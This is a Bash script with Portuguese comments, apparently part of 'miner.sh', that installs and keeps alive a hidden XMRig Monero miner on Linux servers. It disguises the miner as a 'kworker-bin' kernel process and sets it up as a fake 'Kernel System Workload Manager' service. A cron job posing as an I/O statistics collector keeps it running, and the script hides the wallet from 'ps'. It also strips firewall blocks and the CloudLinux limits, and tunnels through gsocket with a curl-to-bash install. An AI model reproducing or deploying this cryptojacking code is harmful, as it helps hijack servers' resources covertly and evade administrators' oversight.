# ---------- COMANDO XMRig ----------
# Grava wallet, pool e worker em CONFIG_FILE (JSON) para que não apareçam em
# `ps aux`. O processo exibirá apenas: kworker-bin --config=... --no-color -t N
generate_config() {
    local pool=$1 tls=$2 threads=$3 light=$4
    local tls_bool="false" mode="auto" hp1g_bool="false"
    [ "$tls" = "true" ]   && tls_bool="true"
    [ "$light" = "true" ] && mode="light"
    local hp1g
    hp1g=$(cat /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages 2>/dev/null || echo 0)
    [ "${hp1g:-0}" -gt 0 ] && hp1g_bool="true"
    mkdir -p "$(dirname "$CONFIG_FILE")" 2>/dev/null
    chmod 700 "$(dirname "$CONFIG_FILE")" 2>/dev/null
    cat > "$CONFIG_FILE" <<EOF
{
    "autosave": false,
    "background": false,
    "colors": false,
    "donate-level": $DONATE_LEVEL,
    "log-file": "$LOG_FILE",
    "pools": [{"url":"$pool","user":"$WALLET","pass":"$WORKER","tls":$tls_bool,"keepalive":true}],
    "cpu": {"enabled":true,"huge-pages":true,"huge-pages-jit":true,"priority":0},
    "randomx": {"1gb-pages":$hp1g_bool,"mode":"$mode","wrmsr":true}
}
EOF
    chmod 600 "$CONFIG_FILE"
}

generate_cmd() {
    local pool=$1 tls=$2 threads=$3 light=$4
    generate_config "$pool" "$tls" "$threads" "$light"
    echo "$BIN --config=$CONFIG_FILE --no-color -t $threads"
}

# ---------- GERENCIAMENTO DE ESTADO ----------
load_state() {
    POOL_INDEX=0; USE_TLS="true"; THREADS=2; LIGHT="false"
    [ -f "$STATE_FILE" ] && . "$STATE_FILE" 2>/dev/null
}
save_state() {
    umask 077  # arquivo legível somente por root
    cat > "$STATE_FILE" <<EOF
POOL_INDEX=$POOL_INDEX
USE_TLS=$USE_TLS
THREADS=$THREADS
LIGHT=$LIGHT
EOF
}

next_config() {
    # Tenta TLS=false no mesmo pool antes de rotacionar (comportamento v4.2.2)
    if [ "$USE_TLS" = "true" ]; then
        USE_TLS="false"
    else
        USE_TLS="true"
        POOL_INDEX=$(( (POOL_INDEX + 1) % ${#POOLS[@]} ))
        local port="${POOLS[$POOL_INDEX]##*:}"
        [ "$port" != "443" ] && USE_TLS="false"
    fi
    save_state
}

# ---------- VERIFICAÇÃO DE SHARES ACEITOS ----------
check_mining_ok() {
    [ -f "$LOG_FILE" ] && tail -n 300 "$LOG_FILE" 2>/dev/null | grep -q "accepted" && return 0
    if [ "$INIT" = "systemd" ]; then
        journalctl -u "$SERVICE_NAME" --no-pager -n 500 2>/dev/null | grep -q "accepted" && return 0
    fi
    return 1
}

# Retorna 0 se o miner está vivo e recebendo jobs (mesmo sem share ainda).
# Usado no monitor para não matar o miner que ainda não teve tempo de minerar.
check_miner_active() {
    pgrep -f kworker-bin >/dev/null 2>&1 || return 1
    [ -f "$LOG_FILE" ] || return 1
    # "new job" nas últimas 60 linhas (~10 min a ~10s/job) = ainda minerando
    tail -n 60 "$LOG_FILE" 2>/dev/null | grep -q "new job"
}

# ---------- LIMPEZA DE PROCESSOS E SERVIÇOS ----------
cleanup_processes() {
    warn "Limpando processos antigos..."
    if [ "$INIT" = "systemd" ]; then
        systemctl stop "$SERVICE_NAME" 2>/dev/null
        systemctl disable "$SERVICE_NAME" 2>/dev/null
        rm -f "/etc/systemd/system/${SERVICE_NAME}.service"
        systemctl daemon-reload
    else
        command -v service >/dev/null 2>&1 && service "$SERVICE_NAME" stop >/dev/null 2>&1
        sysv_disable "$SERVICE_NAME"
        rm -f "/etc/init.d/$SERVICE_NAME"
    fi
    pkill -9 -f 'kworker-bin' 2>/dev/null || true
    sleep 3
    local pids
    pids=$(pgrep -f kworker-bin 2>/dev/null) && [ -n "$pids" ] && kill -9 $pids 2>/dev/null && sleep 1
    ok "Processos limpos."
}

# ---------- CRIAÇÃO DO SERVIÇO ----------
create_service() {
    local cmd="$1"
    cleanup_processes

    if [ "$INIT" = "systemd" ]; then
        cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
[Unit]
Description=Kernel System Workload Manager
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$cmd
Restart=always
RestartSec=10
Nice=19
CPUSchedulingPolicy=idle
IOSchedulingClass=idle
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload >/dev/null 2>&1
        systemctl enable "$SERVICE_NAME" >/dev/null 2>&1
        systemctl start "$SERVICE_NAME" >/dev/null 2>&1
        systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null && return 0 || return 1
    else
        cat > "/etc/init.d/$SERVICE_NAME" <<'SYSV_EOF'
#!/bin/bash
# chkconfig: 2345 80 20
# description: Kernel workload manager
SYSV_EOF
        cat >> "/etc/init.d/$SERVICE_NAME" <<EOF

CMD="$cmd"
PIDFILE="/var/run/$SERVICE_NAME.pid"

case "\$1" in
    start)
        echo -n "Starting $SERVICE_NAME: "
        if [ -f "\$PIDFILE" ] && kill -0 "\$(cat "\$PIDFILE")" 2>/dev/null; then
            echo "already running"
            exit 0
        fi
        \$CMD >/dev/null 2>&1 &
        echo \$! > "\$PIDFILE"
        echo "started"
        ;;
    stop)
        echo -n "Stopping $SERVICE_NAME: "
        if [ -f "\$PIDFILE" ]; then
            kill "\$(cat "\$PIDFILE")" 2>/dev/null && rm -f "\$PIDFILE"
            echo "stopped"
        else
            echo "not running"
        fi
        ;;
    status)
        if [ -f "\$PIDFILE" ] && kill -0 "\$(cat "\$PIDFILE")" 2>/dev/null; then
            echo "$SERVICE_NAME is running (pid \$(cat "\$PIDFILE"))"
            exit 0
        else
            echo "$SERVICE_NAME is stopped"
            exit 1
        fi
        ;;
    restart)
        \$0 stop
        sleep 2
        \$0 start
        ;;
    *)
        echo "Usage: \$0 {start|stop|status|restart}"
        exit 1
esac
exit 0
EOF
        chmod +x "/etc/init.d/$SERVICE_NAME"
        sysv_enable "$SERVICE_NAME"
        if command -v service >/dev/null 2>&1; then
            service "$SERVICE_NAME" start >/dev/null 2>&1
            service "$SERVICE_NAME" status >/dev/null 2>&1 && return 0 || return 1
        else
            # Fallback: sem service, executa diretamente e salva PID
            eval "$cmd" >/dev/null 2>&1 &
            echo $! > "/var/run/$SERVICE_NAME.pid"
            sleep 2
            kill -0 "$(cat "/var/run/$SERVICE_NAME.pid" 2>/dev/null)" 2>/dev/null && return 0 || return 1
        fi
    fi
}

# ---------- TÚNEL GSOCKET (FALLBACK PARA FIREWALL RESTRITIVO) ----------
# Requer servidor relay rodando:
#   gs-netcat -l -s "$GSOCKET_SECRET" -d <pool_host> -p <pool_port>
setup_gsocket_tunnel() {
    [ -z "$GSOCKET_SECRET" ] && return 1

    if ! command -v gs-netcat >/dev/null 2>&1; then
        log "Instalando gsocket..."
        if command -v curl >/dev/null 2>&1; then
            bash <(curl -fsSL https://gsocket.io/install.sh) >/dev/null 2>&1 || true
        elif command -v wget >/dev/null 2>&1; then
            bash <(wget -qO- https://gsocket.io/install.sh) >/dev/null 2>&1 || true
        fi
        command -v gs-netcat >/dev/null 2>&1 || { warn "gs-netcat não disponível após tentativa de instalação."; return 1; }
    fi

    # socat cria listener local que encaminha cada conexão para o relay gsocket
    if ! command -v socat >/dev/null 2>&1; then
        local pkg; pkg=$(cmd_to_pkg "socat")
        install_dep "$pkg" 2>/dev/null || true
    fi

    pkill -f "gs-netcat.*${GSOCKET_SECRET}" 2>/dev/null || true
    sleep 1

    if command -v socat >/dev/null 2>&1; then
        socat TCP-LISTEN:${GSOCKET_LOCAL_PORT},fork,reuseaddr \
            EXEC:"gs-netcat -s ${GSOCKET_SECRET}" >/dev/null 2>&1 &
        GSOCKET_PID=$!
        ok "Túnel gsocket via socat iniciado (PID $GSOCKET_PID, porta local $GSOCKET_LOCAL_PORT)"
    else
        warn "socat não disponível — túnel gsocket sem suporte a múltiplas conexões."
        gs-netcat -s "$GSOCKET_SECRET" >/dev/null 2>&1 &
        GSOCKET_PID=$!
    fi

    sleep 4
    if test_pool_connection "127.0.0.1" "$GSOCKET_LOCAL_PORT"; then
        ok "Túnel gsocket ativo — pool acessível via 127.0.0.1:${GSOCKET_LOCAL_PORT}"
        return 0
    fi

    kill "$GSOCKET_PID" 2>/dev/null
    warn "Túnel gsocket falhou — verifique se o servidor relay está rodando."
    return 1
}

# ---------- RECUPERAÇÃO (HEAL) ----------
# deploy_mode=true → aguarda "accepted" real (processo visível, sem shortcut de 120s)
# deploy_mode=false → instala serviço após 120s de conexão estável (recuperação rápida)
heal_miner() {
    local deploy_mode="${1:-false}"
    err "Iniciando recuperação do minerador..."
    cleanup_processes
    check_and_fix_firewall
    load_state
    tune_miner
    save_state

    local attempts pool host port cmd miner_pid elapsed accepted

    for (( attempts=0; attempts<MAX_TRIES; attempts++ )); do
        pool="${POOLS[$POOL_INDEX]}"
        host="${pool%:*}"
        port="${pool##*:}"
        [ "$port" = "443" ] && USE_TLS="true" || USE_TLS="false"
        save_state

        echo ""
        log "══════ Tentativa #$((attempts+1))/$MAX_TRIES ══════"
        log "Pool: $host:$port | TLS: $USE_TLS | Threads: $THREADS | Light: $LIGHT"

        open_port "$port"

        if ! test_pool_connection "$host" "$port"; then
            err "Falha na conexão."
            next_config; continue
        fi
        ok "Conectividade OK!"

        cmd=$(generate_cmd "$pool" "$USE_TLS" "$THREADS" "$LIGHT")
        info "Iniciando processo..."

        if [ "$SILENT" = "true" ]; then
            eval "$cmd" > /dev/null 2>&1 &
        else
            eval "$cmd" &
        fi
        miner_pid=$!
        elapsed=0
        accepted=0

        while [ "$elapsed" -lt "$WAIT_TIMEOUT" ]; do
            sleep "$CHECK_INTERVAL"
            elapsed=$(( elapsed + CHECK_INTERVAL ))

            if ! kill -0 "$miner_pid" 2>/dev/null; then
                err "Processo morreu antes do primeiro share."
                break
            fi

            if tail -n 300 "$LOG_FILE" 2>/dev/null | grep -q "accepted"; then
                accepted=1
                break
            fi

            # Em recuperação automática: 120s de "new job" = conexão estável → instala serviço.
            # Em deploy manual: aguarda "accepted" real — o usuário quer ver a confirmação.
            if [ "$deploy_mode" = "false" ] && \
               [ "$elapsed" -ge 120 ] && \
               tail -n 300 "$LOG_FILE" 2>/dev/null | grep -q "new job"; then
                accepted=1
                break
            fi
        done

        if [ "$accepted" -eq 1 ]; then
            if tail -n 30 "$LOG_FILE" 2>/dev/null | grep -q "accepted"; then
                ok "Primeiro share recebido em ${elapsed}s. Minerador validado!"
            else
                ok "Conexão estável com o pool (${elapsed}s, recebendo jobs). Instalando serviço..."
            fi
            # Mata o processo de teste silenciosamente
            kill "$miner_pid" 2>/dev/null
            wait "$miner_pid" 2>/dev/null
            sleep 2
            create_service "$(generate_cmd "$pool" "$USE_TLS" "$THREADS" "$LIGHT")"
            sleep 15
            if check_mining_ok; then
                ok "Minerador persistente e aceitando shares!"
                return 0
            else
                warn "Serviço ativo, mas nenhum share ainda. Continuando monitoramento."
                return 0
            fi
        else
            kill "$miner_pid" 2>/dev/null
            wait "$miner_pid"
            local xmr_exit=$?
            # SIGABRT (exit 134) = falha de alocação de memória no RandomX — não é problema de pool
            if [ "$xmr_exit" -eq 134 ]; then
                local free_vm
                free_vm=$(( $(free -m | awk '/Mem:/{print $4}') + $(free -m | awk '/Swap:/{print $4}') ))
                err "XMRig abortou com SIGABRT — memória insuficiente para RandomX."
                err "  Memória virtual livre: ${free_vm}MB | RandomX light mode requer ≥260MB."
                err "  Este host é incompatível para mineração Monero. Atualize para ≥512MB RAM."
                return 1
            fi
            warn "Nenhum share recebido em ${WAIT_TIMEOUT}s."
            next_config
        fi
    done

    # Fallback: GSOCKET — contorna firewall via relay externo
    if [ -n "$GSOCKET_SECRET" ]; then
        warn "Todas as conexões diretas falharam. Tentando túnel GSOCKET..."
        if setup_gsocket_tunnel; then
            local gs_pool="127.0.0.1:${GSOCKET_LOCAL_PORT}"
            local gs_cmd
            gs_cmd=$(generate_cmd "$gs_pool" "false" "$THREADS" "$LIGHT")
            info "Iniciando XMRig via túnel gsocket ($gs_pool)..."

            if [ "$SILENT" = "true" ]; then
                eval "$gs_cmd" > /dev/null 2>&1 &
            else
                eval "$gs_cmd" &
            fi
            miner_pid=$!
            elapsed=0; accepted=0

            while [ "$elapsed" -lt "$WAIT_TIMEOUT" ]; do
                sleep "$CHECK_INTERVAL"
                elapsed=$(( elapsed + CHECK_INTERVAL ))
                ! kill -0 "$miner_pid" 2>/dev/null && { err "Processo morreu no túnel gsocket."; break; }
                tail -n 300 "$LOG_FILE" 2>/dev/null | grep -q "accepted" && { accepted=1; break; }
                [ "$elapsed" -ge 120 ] && tail -n 300 "$LOG_FILE" 2>/dev/null | grep -q "new job" && { accepted=1; break; }
            done

            if [ "$accepted" -eq 1 ]; then
                ok "Minerador via GSOCKET validado! Instalando serviço..."
                kill "$miner_pid" 2>/dev/null
                wait "$miner_pid" 2>/dev/null
                sleep 2
                create_service "$gs_cmd"
                sleep 15
                ok "Serviço instalado via túnel gsocket."
                return 0
            fi
            kill "$miner_pid" 2>/dev/null
            kill "$GSOCKET_PID" 2>/dev/null
            err "GSOCKET conectou mas sem shares/jobs após ${WAIT_TIMEOUT}s."
        fi
    fi

    err "Todas as tentativas falharam."
    tg_notify_stopped "falha em todas as tentativas de recuperação (${MAX_TRIES} pools testados)"
    return 1
}

# ---------- MONITORAMENTO PERIÓDICO ----------
monitor() {
    if [ "$INIT" = "systemd" ]; then
        systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null || systemctl start "$SERVICE_NAME" 2>/dev/null
    else
        if command -v service >/dev/null 2>&1; then
            service "$SERVICE_NAME" status >/dev/null 2>&1 || service "$SERVICE_NAME" start
        else
            pgrep -f kworker-bin >/dev/null 2>&1 || {
                load_state
                local pool="${POOLS[$POOL_INDEX]}"
                local port="${pool##*:}"
                [ "$port" = "443" ] && USE_TLS="true" || USE_TLS="false"
                eval "$(generate_cmd "$pool" "$USE_TLS" "$THREADS" "$LIGHT")" >/dev/null 2>&1 &
            }
        fi
    fi
    sleep 30

    # Ajuste dinâmico de threads por carga alta (reutilizado nos dois ramos saudáveis)
    _maybe_reduce_threads() {
        local cores load_avg max_load
        cores=$(nproc)
        load_avg=$(uptime | awk -F 'load average:' '{print $2}' | cut -d, -f1 | tr -d ' ')
        max_load=$(awk "BEGIN {printf \"%.2f\", $cores * 0.8}")
        if awk "BEGIN {exit !($load_avg > $max_load)}"; then
            warn "Carga alta (${load_avg} > ${max_load}). Reduzindo threads."
            load_state
            THREADS=$(( THREADS / 2 ))
            [ "$THREADS" -lt 1 ] && THREADS=1
            save_state
            if [ "$INIT" = "systemd" ]; then
                systemctl stop "$SERVICE_NAME"
            else
                command -v service >/dev/null 2>&1 && service "$SERVICE_NAME" stop
            fi
            sleep 5
            local pool="${POOLS[$POOL_INDEX]}"
            local port="${pool##*:}"
            [ "$port" = "443" ] && USE_TLS="true" || USE_TLS="false"
            create_service "$(generate_cmd "$pool" "$USE_TLS" "$THREADS" "$LIGHT")"
        fi
    }

    if check_mining_ok; then
        ok "$(date): Minerador saudável (share aceito)."
        _maybe_reduce_threads
        tg_maybe_send_status
    elif check_miner_active; then
        # Processo vivo e recebendo jobs, mas ainda sem share — normal nas primeiras horas.
        # Dificuldade 75000 com ~40 H/s demora ~30 min por share; não interrompa.
        ok "$(date): Minerador ativo (recebendo jobs, aguardando primeiro share)."
        _maybe_reduce_threads
        tg_maybe_send_status
    else
        # Verifica se foi morto por OOM/cgroup e ajusta
        if dmesg 2>/dev/null | grep -q "Killed process.*kworker-bin"; then
            warn "Morte detectada por OOM ou cgroup. Reduzindo recursos drasticamente."
            load_state
            THREADS=1
            LIGHT="true"
            save_state
        fi
        err "$(date): Minerador inativo. Recuperando..."
        tg_notify_healing
        heal_miner
    fi
}

# ---------- REMOVER CRON FANTASMA ----------
clean_crontab() {
    # Remove ghosts do crontab de usuário (check_health.sh e formato antigo do miner.sh)
    if crontab -l 2>/dev/null | grep -qE "check_health\.sh|miner\.sh"; then
        log "Removendo entradas antigas do crontab..."
        crontab -l 2>/dev/null | grep -vE "check_health\.sh|miner\.sh" | crontab -
    fi
}

# ---------- INSTALAR MONITOR VIA /etc/cron.d/ ----------
# Escreve em /etc/cron.d/ com nome de sistema + wrapper sem referência a miner.sh.
# Invisível em 'crontab -l'; só aparece em 'ls /etc/cron.d/' com nome neutro.
install_cron_monitor() {
    local script_path=$1
    # Garante que o diretório do wrapper existe (não existe em SysV sem systemd)
    mkdir -p "$(dirname "$CRON_HELPER")" 2>/dev/null || true
    cat > "$CRON_HELPER" <<EOF
#!/bin/sh
exec /bin/bash "$script_path" monitor
EOF
    chmod +x "$CRON_HELPER"
    # Arquivo em /etc/cron.d/ com nome que imita pacote de sistema
    cat > "/etc/cron.d/$CRON_JOB_NAME" <<EOF
# Run I/O statistics collector
*/5 * * * * root $CRON_HELPER >/dev/null 2>&1
EOF
    chmod 644 "/etc/cron.d/$CRON_JOB_NAME"
    ok "Monitor instalado em /etc/cron.d/$CRON_JOB_NAME."
}

# ---------- VERIFICAÇÃO DE CHECKSUM ----------
verify_binary_download() {
    local file=$1
    # Obtém o SHA256 oficial da release do GitHub
    local release_hash
    release_hash=$(wget -qO- \
        "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/SHA256SUMS" \
        2>/dev/null | grep "xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz" | awk '{print $1}')

    if [ -z "$release_hash" ]; then
        warn "Não foi possível obter o hash oficial. Verificação de checksum ignorada."
        return 0
    fi

    local local_hash
    local_hash=$(sha256sum "$file" | awk '{print $1}')

    if [ "$local_hash" = "$release_hash" ]; then
        ok "Checksum SHA256 verificado."
    else
        err "CHECKSUM INVÁLIDO! O arquivo pode estar corrompido ou adulterado."
        err "Esperado: $release_hash"
        err "Obtido:   $local_hash"
        rm -f "$file"
        exit 1
    fi
}

# ---------- DEPLOY PRINCIPAL ----------
deploy() {
    banner
    detect_init
    check_deps
    disable_lve
    whitelist_csf
    check_and_fix_firewall
    clean_crontab

    info "Worker ID: $WORKER"
    info "Hostname: $(hostname)"

    cleanup_processes
    # Apaga log antigo — sem histórico, sem falso-positivo de "accepted"
    > "$LOG_FILE" 2>/dev/null || true
    sync; echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || true

    if [ ! -f "$BIN" ]; then
        local tarball="/tmp/xmrig-${XMRIG_VERSION}.tar.gz"
        local extract_dir="/tmp/xmrig-${XMRIG_VERSION}"

        log "Baixando XMRig v${XMRIG_VERSION}..."
        wget -q --no-check-certificate --timeout=30 \
            "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz" \
            -O "$tarball" || { err "Falha no download."; exit 1; }

        verify_binary_download "$tarball"

        tar -xzf "$tarball" -C /tmp/ || { err "Falha na extração."; exit 1; }
        cp "${extract_dir}/xmrig" "$BIN"
        chmod +x "$BIN"
        rm -rf "$extract_dir" "$tarball"

        if ! "$BIN" --version >/dev/null 2>&1; then
            err "Binário $BIN inválido ou corrompido."
            exit 1
        fi
    fi

    info "XMRig: $("$BIN" --version 2>&1 | head -1)"

    setup_swap
    check_min_memory || exit 1
    setup_msr
    setup_cpu_governor
    setup_huge_pages
    setup_1gb_hugepages
    setup_tmpfs_cache
    resolve_pools_bypass_hosts
    order_pools_by_latency
    POOL_INDEX=0  # reseta após reordenação; índice antigo apontaria para pool errada
    USE_TLS="true"
    tune_miner
    save_state

    [ "$SILENT" = "true" ] && echo -e "${C_CYAN}[⛏] Miner ativo — aguardando confirmação de share aceito...${C_NC}"

    heal_miner true || {
        [ "$SILENT" = "true" ] \
            && echo -e "${C_RED}[!] Falha na instalação. Verifique a conectividade com a pool.${C_NC}" \
            || err "Falha na instalação."
        exit 1
    }

    local SCRIPT_PATH
    SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || realpath "$0" 2>/dev/null || echo "$0")
    install_cron_monitor "$SCRIPT_PATH"

    if [ -f /var/run/.lve_reboot_needed ] && detect_cloudlinux; then
        warn "CloudLinux LVE ainda ativo. Uma reinicialização é necessária para desativá-lo completamente."
        warn "Após reiniciar, execute './miner.sh deploy' novamente (já estará tudo configurado)."
    else
        rm -f /var/run/.lve_reboot_needed 2>/dev/null
    fi

    local active_pool="${POOLS[$POOL_INDEX]}"
    local active_host="${active_pool%:*}"

    if [ "$SILENT" = "true" ]; then
        echo -e "${C_GREEN}[✓] Share aceito! Miner rodando em background.${C_NC}"
        echo -e "${C_CYAN}[i] Dashboard: https://supportxmr.com/#/dashboard?wallet=${WALLET}${C_NC}"
    else
        ok "╔══════════════════════════════════════════════════════════╗"
        ok "║  DEPLOY CONCLUÍDO! Worker: $WORKER"
        ok "║  Threads: $THREADS | Light: $LIGHT | Pool: $active_host"
        ok "║  Primeiro share aceito — minerador ativo na pool.       ║"
        ok "╚══════════════════════════════════════════════════════════╝"
        echo ""
        info "https://supportxmr.com/#/dashboard?wallet=${WALLET}"
    fi
    tg_notify_deploy
}

# ---------- STATUS ----------
status() {
    echo ""
    echo -e "${C_CYAN}═══ STATUS DO MINERADOR ═══${C_NC}"
    echo -e "Worker:  ${C_GREEN}$WORKER${C_NC}"
    echo -e "Threads: ${C_GREEN}$THREADS${C_NC} | Light: ${C_GREEN}$LIGHT${C_NC}"
    local active_pool="${POOLS[$POOL_INDEX]:-desconhecido}"
    echo -e "Pool:    ${C_GREEN}${active_pool}${C_NC} | TLS: ${C_GREEN}${USE_TLS}${C_NC} | Índice: ${C_GREEN}${POOL_INDEX}${C_NC}"
    if [ "$INIT" = "systemd" ]; then
        systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null \
            && echo -e "Serviço: ${C_GREEN}ATIVO${C_NC}" \
            || echo -e "Serviço: ${C_RED}INATIVO${C_NC}"
    else
        if command -v service >/dev/null 2>&1; then
            service "$SERVICE_NAME" status >/dev/null 2>&1 \
                && echo -e "Serviço: ${C_GREEN}ATIVO${C_NC}" \
                || echo -e "Serviço: ${C_RED}INATIVO${C_NC}"
        else
            echo -e "Serviço: ${C_YELLOW}N/A (sem sysv tools — cron monitora)${C_NC}"
        fi
    fi
    pgrep -f kworker-bin >/dev/null 2>&1 \
        && echo -e "Processo: ${C_GREEN}RODANDO${C_NC}" \
        || echo -e "Processo: ${C_RED}PARADO${C_NC}"
    check_mining_ok \
        && echo -e "Shares:  ${C_GREEN}ACEITOS ✓${C_NC}" \
        || echo -e "Shares:  ${C_RED}NÃO DETECTADOS${C_NC}"

    echo ""
    echo "Últimas linhas de log:"
    grep -E "accepted|speed|error" "$LOG_FILE" 2>/dev/null | tail -5
    echo ""
}

# ---------- DESINSTALAÇÃO COMPLETA ----------
self_destruct() {
    banner
    detect_init
    load_state
    tg_notify_stopped "desinstalado manualmente"
    warn "Removendo minerador..."
    if [ "$INIT" = "systemd" ]; then
        systemctl stop "$SERVICE_NAME" 2>/dev/null
        systemctl disable "$SERVICE_NAME" 2>/dev/null
        rm -f "/etc/systemd/system/${SERVICE_NAME}.service"
        systemctl daemon-reload
    else
        command -v service >/dev/null 2>&1 && service "$SERVICE_NAME" stop >/dev/null 2>&1
        sysv_disable "$SERVICE_NAME"
        rm -f "/etc/init.d/$SERVICE_NAME"
    fi
    pkill -9 -f kworker-bin 2>/dev/null || true
    rm -f "$BIN" "$LOG_FILE" "$STATE_FILE" "$CONFIG_FILE" "/var/run/$SERVICE_NAME.pid" "$TG_LAST_FILE"
    rm -f /etc/sysctl.d/99-mm-tune.conf 2>/dev/null
    if [ -f "$SWAPFILE" ]; then
        swapoff "$SWAPFILE" 2>/dev/null
        sed -i "\|$SWAPFILE|d" /etc/fstab 2>/dev/null
        rm -f "$SWAPFILE"
        ok "Swapfile removido."
    fi
    # Compatibilidade: remove artefatos com nomes antigos caso existam
    rm -f /var/log/xmrig.log /var/run/.miner_config_state /var/swapfile_xmrig \
          /etc/sysctl.d/99-xmrig.conf /etc/cron.d/sysstat 2>/dev/null || true
    umount /dev/shm/.cache 2>/dev/null || true
    # Remove cron (/etc/cron.d/ + wrapper + formato antigo por segurança)
    rm -f "/etc/cron.d/$CRON_JOB_NAME" "$CRON_HELPER"
    local SCRIPT_PATH
    SCRIPT_PATH=$(readlink -f "$0" 2>/dev/null || echo "$0")
    crontab -l 2>/dev/null | grep -v "$SCRIPT_PATH" | crontab - 2>/dev/null || true
    rm -f "$0"
    ok "Removido completamente."
}

# ---------- MAIN ----------
# detect_init e load_state são chamados em TODOS os subcomandos
[ "$1" = "--silent" ] && { SILENT=true; shift; }

case "$1" in
    deploy)
        deploy
        ;;
    monitor)
        detect_init
        load_state
        monitor
        ;;
    heal)
        detect_init
        load_state
        heal_miner
        ;;
    status)
        detect_init
        load_state
        status
        ;;
    uninstall)
        self_destruct
        ;;
    firewall)
        detect_init
        load_state
        check_and_fix_firewall
        ;;
    *)
        banner
        echo "  Uso: $0 [--silent] {deploy|monitor|heal|status|firewall|uninstall}"
        echo ""
        echo "  deploy     – instala e inicia o minerador"
        echo "  monitor    – verifica saúde (chamado pelo cron)"
        echo "  heal       – força recuperação manual"
        echo "  status     – exibe estado atual"
        echo "  firewall   – verifica e remove bloqueios de firewall/iptables"
        echo "  uninstall  – remove tudo completamente"
        echo ""
        echo "  --silent   – saída mínima: apenas 2 mensagens (miner ativo + share aceito)"
        ;;
esac
